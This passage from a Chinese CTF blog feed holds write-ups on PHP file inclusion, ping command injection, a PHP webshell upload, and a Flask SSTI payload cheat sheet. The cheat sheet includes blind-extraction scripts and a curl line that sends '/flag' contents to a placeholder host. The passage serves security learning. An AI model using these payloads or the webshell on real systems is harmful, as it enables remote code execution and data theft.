flag?网址为：http://639457fd-50a6-49a7-9545-9c59db0af0f2.node4.buuoj.cn:81/?file=flag.php</code></pre><p>判断为文件包含。考虑 “php://input”伪协议 + POST发送PHP代码的经典套路。</p><pre class=" language-1"><code class="language-1">回显：hacker!</code></pre><p>使用 “php://filter”伪协议” 来进行包含。<br>注意:使用php://filter伪协议进行文件包含时，需要加上read=convert.base64-encode来对文件内容进行编码，阻止其执行。<br>构造Payload: </p><pre class=" language-1"><code class="language-1">http://639457fd-50a6-49a7-9545-9c59db0af0f2.node4.buuoj.cn:81/?file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><p>得到</p><pre class=" language-1"><code class="language-1">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7YTg3YTM2NjgtNzdlNC00ZTZjLWI1M2UtYmRiMzQ4ZTQyMzdhfQo=base64解码后为<?phpecho "Can you find out the flag?";//flag{a87a3668-77e4-4e6c-b53e-bdb348e4237a}</code></pre><p>得到flag:flag{a87a3668-77e4-4e6c-b53e-bdb348e4237a}<br>参考：<br><a href="https://blog.csdn.net/xg_ren/article/details/79040414">https://blog.csdn.net/xg_ren/article/details/79040414</a><br><a href="https://www.cnblogs.com/xiaobai141/p/14179629.html">https://www.cnblogs.com/xiaobai141/p/14179629.html</a><br><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html">https://www.cnblogs.com/zzjdbk/p/13030717.html</a><br><a href="https://www.php.net/manual/zh/wrappers.php.php#refsect2-wrappers.php-unknown-unknown-unknown-descriptioq">https://www.php.net/manual/zh/wrappers.php.php#refsect2-wrappers.php-unknown-unknown-unknown-descriptioq</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-文件包含 ctf-php伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2020 新生赛 exec 1 题解</title>
      <link href="/2022/01/21/ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%20exec%201%20%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/01/21/ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%20exec%201%20%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="ACTF2020-新生赛-exec-1-题解"><a href="#ACTF2020-新生赛-exec-1-题解" class="headerlink" title="ACTF2020 新生赛 exec 1 题解"></a>ACTF2020 新生赛 exec 1 题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="常见管道符"><a href="#常见管道符" class="headerlink" title="常见管道符"></a>常见管道符</h3><h4 id=""><a href="#" class="headerlink" title="|"></a>|</h4><p>直接执行|后面的语句。</p><h4 id="-1"><a href="#-1" class="headerlink" title="||"></a>||</h4><p>如果前面的命令错误则执行后面的语句，否则不执行。</p><h4 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h4><p>无论真假，前后命令均执行。</p><h4 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h4><p>如果前面的命令正确则执行后面的语句，否则不执行。</p><h4 id="-2"><a href="#-2" class="headerlink" title=";"></a>;</h4><p>linux下的，和&amp;相同。</p><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>进入题目，有一个输入框，提示输入要ping的地址。输入127.0.0.1，回显</p><pre class=" language-1"><code class="language-1">PING 127.0.0.1 (127.0.0.1): 56 data bytes</code></pre><p>尝试闭合单双引号无果后，试用;。输入127.0.0.1;ls，回显</p><pre class=" language-1"><code class="language-1">PING 127.0.0.1 (127.0.0.1): 56 data bytesindex.php</code></pre><p>执行成功，接下来找flag，最后构造127.0.0.1;ls ../../../</p><pre class=" language-1"><code class="language-1">PING 127.0.0.1 (127.0.0.1): 56 data bytesbindevetcflaghomelibmediamntoptprocrootrunsbinsrvsystmpusrvar</code></pre><p>找到flag，最后输入127.0.0.1;cat ../../../flag<br>得到flag:flag{ba548127-f0dd-41c2-9f59-d3e0475ad18c}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-管道符 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战 2019 Upload 1题解</title>
      <link href="/2022/01/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20Upload%201%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/01/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20Upload%201%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="极客大挑战-2019-Upload-1题解"><a href="#极客大挑战-2019-Upload-1题解" class="headerlink" title="[极客大挑战 2019]Upload 1题解"></a>[极客大挑战 2019]Upload 1题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="图片的文件头"><a href="#图片的文件头" class="headerlink" title="图片的文件头"></a>图片的文件头</h3><p>GIF89a</p><h3 id="文件上传后的常用路径"><a href="#文件上传后的常用路径" class="headerlink" title="文件上传后的常用路径"></a>文件上传后的常用路径</h3><pre class=" language-1"><code class="language-1">http://xxxx/upload/文件名</code></pre><h3 id="常见的php后缀"><a href="#常见的php后缀" class="headerlink" title="常见的php后缀"></a>常见的php后缀</h3><p>php2, php3, php3, php5, phps, pht, phtm, phtml</p><h3 id="一句话木马被ban-lt"><a href="#一句话木马被ban-lt" class="headerlink" title="一句话木马被ban< ?"></a>一句话木马被ban&lt; ?</h3><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>kb<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>打开题目是文件上传，要求上传头像<br>写一个一句话木马</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'kb'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p>直接上传，用burpsuite抓包，发现content-type，将其值改为image/jpeg，send发现<br><img src="https://kingofkb.github.io/medias/image/20220119/notphp.png" alt="notphp"><br>尝试将后缀改为phtml，发现<br><img src="https://kingofkb.github.io/medias/image/20220119/ban.png" alt="ban"><br>将一句话木马改为</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>kb<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre><p>重新提交，发现<br><img src="https://kingofkb.github.io/medias/image/20220119/notimage.png" alt="notimage"><br>猜测可能检查图片文件头，将一句话木马改为</p><pre class=" language-php"><code class="language-php">GIF89a<span class="token operator">?</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>kb<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre><p>重新提交<br><img src="https://kingofkb.github.io/medias/image/20220119/success.png" alt="success"><br>猜测文件上传到/upload/文件名中，访问，找到文件。<br>利用蚁剑链接，在/中找到flag</p><p>参考：<br><a href="https://blog.csdn.net/rfrder/article/details/109225258">https://blog.csdn.net/rfrder/article/details/109225258</a><br><a href="https://www.cnblogs.com/yunqian2017/p/13308641.html">https://www.cnblogs.com/yunqian2017/p/13308641.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-一句话木马 ctf-&lt;?绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>长安战疫web-flask复现</title>
      <link href="/2022/01/18/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABweb-flask%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/01/18/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABweb-flask%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="长安战疫web-flask复现"><a href="#长安战疫web-flask复现" class="headerlink" title="长安战疫web-flask复现"></a>长安战疫web-flask复现</h1><p>由于hexo博客框架的一些问题，以下在{ {与{ %之间加入空格，同时将&lt; type ‘str’ &gt;的&lt;后与&gt;前加入空格。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="flask模板注入"><a href="#flask模板注入" class="headerlink" title="flask模板注入"></a>flask模板注入</h3><h4 id="常用的魔术方法"><a href="#常用的魔术方法" class="headerlink" title="常用的魔术方法"></a>常用的魔术方法</h4><pre class=" language-python"><code class="language-python">__class__  返回类型所属的对象__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。__base__   返回该对象所继承的基类<span class="token operator">//</span> __base__和__mro__都是用来寻找基类的__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表__init__  类的初始化方法__globals__  对包含函数全局变量的字典的引用</code></pre><h4 id="常规步骤"><a href="#常规步骤" class="headerlink" title="常规步骤"></a>常规步骤</h4><p>1.测试是否存在模板注入</p><pre class=" language-1"><code class="language-1">?name={ {1*1} }回显：1</code></pre><p>2.获取’’字符串的所属对象</p><pre class=" language-1"><code class="language-1">?name=''.__class__回显：< type 'str' ></code></pre><p>3.获取str类的父类</p><pre class=" language-1"><code class="language-1">?name=''.__class__.__mro__回显：(< class 'str' >, < class 'object' >)</code></pre><p>4.获取object的所有子类</p><pre class=" language-1"><code class="language-1">?name=''.__class__.__mro__[1].__subclasses__()回显：[< class 'type' >, < class 'weakref' >, < class 'weakcallableproxy' >, < class 'weakproxy' >, < class 'int' >, < class 'bytearray' >, < class 'bytes' >, < class 'list' >, < class 'NoneType' >, < class 'NotImplementedType' >, < class 'traceback' >, < class 'super' >...</code></pre><p>5.寻找可用的引用并引用</p><h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><p>现在只需要从这些类中寻找需要的类，用数组下标获取，然后执行该类中想要执行的函数即可。比如第41个类是file类，就可以构造利用：</p><pre class=" language-1"><code class="language-1">?name=''.__class__.__mro__[1].__subclasses__()[40]('< File_To_Read >').read()</code></pre><p>如果没有file类，使用类***&lt;class ‘_frozen_importlib_external.FileLoader’&gt;***，可以进行文件的读取。这里是第91个类。</p><pre class=" language-1"><code class="language-1">?name=''.__class__.__mro__[1].__subclasses__()[91].get_data(0,"< file_To_Read >")</code></pre><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>首先通过脚本找到包含os模块的类</p><pre class=" language-python"><code class="language-python">num <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> item <span class="token keyword">in</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>         <span class="token keyword">if</span> <span class="token string">'os'</span> <span class="token keyword">in</span> item<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">:</span>             <span class="token keyword">print</span> <span class="token punctuation">(</span>num<span class="token punctuation">,</span>item<span class="token punctuation">)</span>         num<span class="token operator">+=</span><span class="token number">1</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>        num<span class="token operator">+=</span><span class="token number">1</span></code></pre><p>假设输出为x编号的类，则可以构造</p><pre class=" language-1"><code class="language-1">?name=''.__class__.__mro__[1].__subclasses__()[x].__init__.__globals__['os'].system('ls')</code></pre><p>常用的包含os模板的类：</p><pre class=" language-1"><code class="language-1">< class 'site._Printer' >< class 'site.Quitter' ></code></pre><p>常用</p><pre class=" language-1"><code class="language-1">?name=''.__class__.__mro__[1].__subclasses__()[71].__init__.__globals__['os'].system('ls')</code></pre><h5 id="常用的payload"><a href="#常用的payload" class="headerlink" title="常用的payload"></a>常用的payload</h5><pre class=" language-1"><code class="language-1">?name=''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()?name=''.__class__.__mro__[1].__subclasses__()[71].__init__.__globals__['os'].system('ls')?name=''.__class__.__mro__[1].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()</code></pre><h3 id="SSTI沙盒逃逸详细总结"><a href="#SSTI沙盒逃逸详细总结" class="headerlink" title="SSTI沙盒逃逸详细总结"></a>SSTI沙盒逃逸详细总结</h3><p><a href="https://www.anquanke.com/post/id/188172">https://www.anquanke.com/post/id/188172</a></p><h3 id="SSTL模板注入绕过方法"><a href="#SSTL模板注入绕过方法" class="headerlink" title="SSTL模板注入绕过方法"></a>SSTL模板注入绕过方法</h3><p>借鉴(抄袭)大佬博客<a href="https://blog.csdn.net/qq_45834505/article/details/116839614">https://blog.csdn.net/qq_45834505/article/details/116839614</a> 强推</p><h4 id="过滤单双引号"><a href="#过滤单双引号" class="headerlink" title="过滤单双引号"></a>过滤单双引号</h4><h5 id="使用request绕过"><a href="#使用request绕过" class="headerlink" title="使用request绕过"></a>使用request绕过</h5><pre class=" language-1"><code class="language-1">?a=os&b=popen&c=cat /flag&name={ {url_for.__globals__[request.args.a][request.args.b](request.args.c).read()} }</code></pre><h5 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h5><pre class=" language-1"><code class="language-1">?name={ {url_for.__globals__[(config.__str__()[2])%2B(config.__str__()[42])]} }==?name={ {url_for.__globals__['os']} }</code></pre><h4 id="过滤args，中括号"><a href="#过滤args，中括号" class="headerlink" title="过滤args，中括号"></a>过滤args，中括号</h4><h5 id="cookie传值"><a href="#cookie传值" class="headerlink" title="cookie传值"></a>cookie传值</h5><pre class=" language-1"><code class="language-1">?name={ {x.__init__.__globals__[request.cookies.x1].eval(request.cookies.x2)} }Cookie:x1=__builtins__;x2=__import__('os').popen('cat /flag').read()</code></pre><h4 id="过滤下划线，os"><a href="#过滤下划线，os" class="headerlink" title="过滤下划线，os"></a>过滤下划线，os</h4><h5 id="使用自带过滤器attr"><a href="#使用自带过滤器attr" class="headerlink" title="使用自带过滤器attr"></a>使用自带过滤器attr</h5><pre class=" language-1"><code class="language-1">?name={ {(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5)} }Cookie:x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__('os').popen('cat /flag').read()</code></pre><h4 id="过滤-undefined-undefined"><a href="#过滤-undefined-undefined" class="headerlink" title="过滤{ undefined { undefined"></a>过滤{ undefined { undefined</h4><h5 id="将-undefined-换成-来绕过"><a href="#将-undefined-换成-来绕过" class="headerlink" title="将{ undefined { 换成{ % % }来绕过"></a>将{ undefined { 换成{ % % }来绕过</h5><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p>原理就在于open(’/flag’).read()是回显整个文件，但是read函数里加上参数：open(’/flag’).read(i)，返回的就是读出所读的文件里的i个字符，以此类推，就可以盲注出了</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span><span class="token string">'http://85302b44-c999-432c-8891-7ebdf703d6c0.chall.ctf.show/?name={%set aaa=(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4)%}{%if aaa.eval(request.cookies.x5)==request.cookies.x6%}1341{%endif%}'</span>s<span class="token operator">=</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span><span class="token string">"{-}"</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> s<span class="token punctuation">:</span>        x<span class="token operator">=</span>flag<span class="token operator">+</span>j        headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span><span class="token triple-quoted-string string">'''x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=open('/flag').read({0});x6={1}'''</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">}</span>        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(r.text)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"1341"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span>x            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="ban了request"><a href="#ban了request" class="headerlink" title="ban了request"></a>ban了request</h4><h5 id="得到被ban的字符"><a href="#得到被ban的字符" class="headerlink" title="得到被ban的字符"></a>得到被ban的字符</h5><p>譬如：</p><pre class=" language-1"><code class="language-1">{ % set a=dict(o=oo,s=ss)|join % }</code></pre><p>这样得到的a就是把这个字典的键名拼接后的值，即os，这样的拼接不需要用到单双引号，常用payload：</p><pre class=" language-1"><code class="language-1">?name={ % set po=dict(po=a,p=a)|join% }{ % set a=(()|select|string|list)|attr(po)(24)% }{ % set ini=(a,a,dict(init=a)|join,a,a)|join()% }{ % set glo=(a,a,dict(globals=a)|join,a,a)|join()% }{ % set geti=(a,a,dict(getitem=a)|join,a,a)|join()% }{ % set built=(a,a,dict(builtins=a)|join,a,a)|join()% }{ % set x=(q|attr(ini)|attr(glo)|attr(geti))(built)% }{ % set chr=x.chr% }{ % set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)% }{ %print(x.open(file).read())% }</code></pre><h5 id="读文件盲注"><a href="#读文件盲注" class="headerlink" title="读文件盲注"></a>读文件盲注</h5><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> string<span class="token keyword">def</span> <span class="token function">ccchr</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">&lt;</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            t<span class="token operator">+=</span><span class="token string">'chr('</span><span class="token operator">+</span>str<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">')%2b'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            t<span class="token operator">+=</span><span class="token string">'chr('</span><span class="token operator">+</span>str<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">')'</span>    <span class="token keyword">return</span> turl <span class="token operator">=</span><span class="token triple-quoted-string string">'''http://b134fd30-bddc-4302-8578-8005b96f73c2.chall.ctf.show/?name={ % set a=(()|select|string|list).pop(24)% }{ % set ini=(a,a,dict(init=a)|join,a,a)|join()% }{ % set glo=(a,a,dict(globals=a)|join,a,a)|join()% }{ % set geti=(a,a,dict(getitem=a)|join,a,a)|join()% }{ % set built=(a,a,dict(builtins=a)|join,a,a)|join()% }{ % set x=(q|attr(ini)|attr(glo)|attr(geti))(built)% }{ % set chr=x.chr% }{ % set cmd=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)% }{ % set cmd2='''</span>s<span class="token operator">=</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span><span class="token string">'{_-}'</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> s<span class="token punctuation">:</span>        x<span class="token operator">=</span>flag<span class="token operator">+</span>j        u<span class="token operator">=</span>url<span class="token operator">+</span>ccchr<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'% }'</span><span class="token operator">+</span><span class="token string">'{ % if x.open(cmd).read('</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">')==cmd2% }'</span><span class="token operator">+</span><span class="token string">'1341'</span><span class="token operator">+</span><span class="token string">'{ % endif% }'</span>        <span class="token comment" spellcheck="true">#print(u)</span>        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>u<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"1341"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>                        flag<span class="token operator">=</span>x            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="ban了数字"><a href="#ban了数字" class="headerlink" title="ban了数字"></a>ban了数字</h4><h6 id="使用length来获得数字"><a href="#使用length来获得数字" class="headerlink" title="使用length来获得数字"></a>使用length来获得数字</h6><p>(length可以用count代替)如:</p><pre class=" language-1"><code class="language-1">?name={ % set c=(dict(e=a)|join|count)% }{ % set cc=(dict(ee=a)|join|count)% }{ % set ccc=(dict(eee=a)|join|count)% }{ % set cccc=(dict(eeee=a)|join|count)% }{ % set ccccccc=(dict(eeeeeee=a)|join|count)% }{ % set cccccccc=(dict(eeeeeeee=a)|join|count)% }{ % set ccccccccc=(dict(eeeeeeeee=a)|join|count)% }{ % set cccccccccc=(dict(eeeeeeeeee=a)|join|count)% }{ % set coun=(cc~cccc)|int% }{ % set po=dict(po=a,p=a)|join% }{ % set a=(()|select|string|list)|attr(po)(coun)% }{ % set ini=(a,a,dict(init=a)|join,a,a)|join()% }{ % set glo=(a,a,dict(globals=a)|join,a,a)|join()% }{ % set geti=(a,a,dict(getitem=a)|join,a,a)|join()% }{ % set built=(a,a,dict(builtins=a)|join,a,a)|join()% }{ % set x=(q|attr(ini)|attr(glo)|attr(geti))(built)% }{ % set chr=x.chr% }{ % set file=chr((cccc~ccccccc)|int)%2bchr((cccccccccc~cc)|int)%2bchr((cccccccccc~cccccccc)|int)%2bchr((ccccccccc~ccccccc)|int)%2bchr((cccccccccc~ccc)|int)% }{ %print(x.open(file).read())% }</code></pre><h4 id="过滤了print"><a href="#过滤了print" class="headerlink" title="过滤了print"></a>过滤了print</h4><pre class=" language-1"><code class="language-1">http://c8f74fd3-a05a-477c-bb97-10325b9ce77d.chall.ctf.show?name={ % set c=(t|count)% }{ % set cc=(dict(e=a)|join|count)% }{ % set ccc=(dict(ee=a)|join|count)% }{ % set cccc=(dict(eee=a)|join|count)% }{ % set ccccc=(dict(eeee=a)|join|count)% }{ % set cccccc=(dict(eeeee=a)|join|count)% }{ % set ccccccc=(dict(eeeeee=a)|join|count)% }{ % set cccccccc=(dict(eeeeeee=a)|join|count)% }{ % set ccccccccc=(dict(eeeeeeee=a)|join|count)% }{ % set cccccccccc=(dict(eeeeeeeee=a)|join|count)% }{ % set ccccccccccc=(dict(eeeeeeeeee=a)|join|count)% }{ % set cccccccccccc=(dict(eeeeeeeeeee=a)|join|count)% }{ % set coun=(ccc~ccccc)|int% }{ % set po=dict(po=a,p=a)|join% }{ % set a=(()|select|string|list)|attr(po)(coun)% }{ % set ini=(a,a,dict(init=a)|join,a,a)|join()% }{ % set glo=(a,a,dict(globals=a)|join,a,a)|join()% }{ % set geti=(a,a,dict(getitem=a)|join,a,a)|join()% }{ % set built=(a,a,dict(builtins=a)|join,a,a)|join()% }{ % set x=(q|attr(ini)|attr(glo)|attr(geti))(built)% }{ % set chr=x.chr% }{ % set cmd=% }{ %if x.eval(cmd)% }abc{ %endif% }</code></pre><p>cmd中内容用下面代码生成</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">aaa</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token operator">=</span><span class="token string">'('</span><span class="token operator">+</span><span class="token punctuation">(</span>int<span class="token punctuation">(</span>t<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">'c'</span><span class="token operator">+</span><span class="token string">'~'</span><span class="token operator">+</span><span class="token punctuation">(</span>int<span class="token punctuation">(</span>t<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">'c'</span><span class="token operator">+</span><span class="token string">')|int'</span>    <span class="token keyword">return</span> ts<span class="token operator">=</span><span class="token string">'__import__("os").popen("curl http://xxx:4567?p=`cat /flag`").read()'</span><span class="token keyword">def</span> <span class="token function">ccchr</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">&lt;</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            t<span class="token operator">+=</span><span class="token string">'chr('</span><span class="token operator">+</span>aaa<span class="token punctuation">(</span>str<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">')%2b'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            t<span class="token operator">+=</span><span class="token string">'chr('</span><span class="token operator">+</span>aaa<span class="token punctuation">(</span>str<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">')'</span>    <span class="token keyword">return</span> t<span class="token keyword">print</span><span class="token punctuation">(</span>ccchr<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>启动环境，F12有提示</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--/admin--></span><span class="token comment" spellcheck="true">&lt;!--/static.js--></span><span class="token comment" spellcheck="true">&lt;!--if not request.full_path.endswith(".js?"):            if not request.full_path.startswith("/login"):                return redirect("login")--></span></code></pre><p>payload必须以.js?结尾，访问/admin?.js?，得到提示：admin/?name=，name值可控，尝试构造</p><pre class=" language-1"><code class="language-1">/admin?name={ {1*1} }.js?</code></pre><p>得到回显1，发现可以注入。构造</p><pre class=" language-1"><code 